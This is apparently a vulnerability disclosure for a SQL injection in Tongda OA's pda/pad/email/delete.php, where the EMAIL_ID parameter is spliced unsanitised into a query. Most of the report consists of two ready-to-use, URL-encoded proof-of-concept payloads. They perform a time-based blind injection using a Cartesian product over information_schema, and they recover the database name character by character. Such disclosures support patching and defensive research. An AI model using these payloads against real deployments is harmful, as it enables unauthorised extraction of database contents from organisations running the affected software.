SQL injection vulnerability exists in Tongda OA

version:Versions below v11.10 and v2017

Route: pda/pad/email/delete.php

There is an injected parameter: $EMAIL_ID

The code here is very concise. When $EMAIL_ID is not empty, the parameters are directly spliced ​​into the SQL statement. Since the parentheses are closed here, there is a bypass.

![image](https://github.com/13223355/cve/assets/115934830/656f22b2-5217-48f1-ac32-fde509520939)

2.Payload
We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.

POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/13223355/cve/assets/115934830/8c8ffc16-566c-495b-a3f4-62fb78f57338)

And when we change 116 to 115, there will be no delay, indicating the existence of SQL injection.

POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(115)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image](https://github.com/13223355/cve/assets/115934830/155135c9-5896-45a2-90da-8c28ffe14cf9)
